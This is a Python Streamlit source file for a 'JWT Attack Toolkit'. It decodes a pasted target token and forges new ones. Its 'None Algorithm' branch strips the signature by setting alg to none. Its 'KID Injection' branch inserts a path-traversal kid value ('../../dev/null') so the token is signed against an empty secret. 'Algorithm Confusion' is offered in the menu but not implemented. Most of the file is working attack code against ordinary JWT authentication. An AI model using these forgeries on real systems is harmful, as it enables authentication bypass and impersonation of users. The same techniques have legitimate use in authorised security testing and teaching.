import streamlit as st
import json
import base64
import hmac
import hashlib
from colorama import Fore

# --- LOGIC (From your jwt_attacker.py) ---

def b64_decode_padding(data: str) -> bytes:
    padding = 4 - len(data) % 4
    return base64.urlsafe_b64decode(data + "=" * padding)

def decode_token_parts(token: str):
    try:
        parts = token.split(".")
        if len(parts) != 3: return None, None, None
        header = json.loads(b64_decode_padding(parts[0]))
        payload = json.loads(b64_decode_padding(parts[1]))
        return header, payload, parts
    except:
        return None, None, None

# --- FRONTEND UI ---

st.set_page_config(page_title="JWT Attack Toolkit", page_icon="🛡️")
st.title("🛡️ JWT Attack Toolkit")
st.markdown("### Ethical Use Only")

# Sidebar for inputs
st.sidebar.header("Configuration")
target_token = st.sidebar.text_area("Paste Target JWT Token here:")
attack_type = st.sidebar.selectbox("Select Attack Vector", 
    ["Token Info", "None Algorithm", "Algorithm Confusion", "KID Injection"])

if st.button("Launch Attack"):
    if not target_token:
        st.error("Please provide a JWT token first!")
    else:
        header, payload, parts = decode_token_parts(target_token)
        
        if not header:
            st.error("Invalid JWT format!")
        else:
            # 1. Info Display
            if attack_type == "Token Info":
                st.subheader("Token Data")
                st.json(header)
                st.json(payload)

            # 2. None Algorithm Attack
            elif attack_type == "None Algorithm":
                st.subheader("Running None Algorithm Bypass")
                header["alg"] = "none"
                new_h = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=")
                forged = f"{new_h}.{parts[1]}."
                st.success("Forged Token Generated!")
                st.code(forged)

            # 3. KID Injection Attack
            elif attack_type == "KID Injection":
                st.subheader("Running KID Injection")
                kid_val = st.text_input("KID Payload", "../../dev/null")
                header["kid"] = kid_val
                header["alg"] = "HS256"
                new_h = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=")
                st.info(f"Injecting: {kid_val}")
                # (Simplified forge logic for the UI)
                st.warning("Manual verification required with empty secret.")